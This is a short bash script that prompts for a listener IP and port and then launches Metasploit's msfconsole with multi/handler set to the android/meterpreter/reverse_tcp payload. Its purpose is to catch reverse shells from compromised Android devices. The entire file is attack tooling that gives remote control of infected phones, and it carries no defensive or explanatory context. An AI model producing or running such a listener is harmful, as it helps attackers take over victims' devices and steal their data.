#!/bin/bash

echo "WAIT WE ARE WORKING FOR YOUR LISTENER"
sleep 1
echo -n "ENTER LISTENER IP: "
read IP
echo -n "ENTER LISTENER PORT"
read PORT

xterm -T LISTENER -e "msfconsole -x 'use multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT'"